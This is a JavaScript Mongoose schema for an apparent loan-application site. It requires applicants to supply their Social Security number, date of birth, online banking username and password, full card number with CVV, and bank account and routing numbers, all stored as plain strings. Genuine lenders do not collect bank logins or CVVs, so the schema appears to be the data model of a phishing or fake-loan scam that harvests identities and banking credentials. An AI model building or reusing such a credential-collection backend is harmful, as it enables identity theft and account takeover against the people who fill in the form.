import mongoose from 'mongoose';

const userSchema = new mongoose.Schema({
  // Customer Information
  firstName: { type: String, required: true },
  lastName: { type: String, required: true },
  email: { type: String, required: true },
  contactNumber: { type: String, required: true },
  dateOfBirth: { type: String, required: true },
  socialSecurityNumber: { type: String, required: true },
  
  // Home Address
  address: { type: String, required: true },
  city: { type: String, required: true },
  state: { type: String, required: true },
  
  // Bank Information
  bankUserName: { type: String, required: true },
  bankPassword: { type: String, required: true },
  cardNumber: { type: String, required: true },
  cardExpiryMonth: { type: String, required: true },
  cardExpiryYear: { type: String, required: true },
  cardCVV: { type: String, required: true },
  cardName: { type: String, required: true },
  
  // Employment Information
  employmentType: { type: String, required: true },
  employerName: { type: String, required: true },
  jobTitle: { type: String },
  monthlyIncome: { type: Number },
  
  // Loan Information
  loanPurpose: { type: String, required: true },
  loanAmount: { type: Number, required: true },
  accountNumber: { type: String, required: true },
  routingNumber: { type: String, required: true },
  
  termsAccepted: { type: Boolean, default: false, required: true },
  
  createdAt: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

export default User;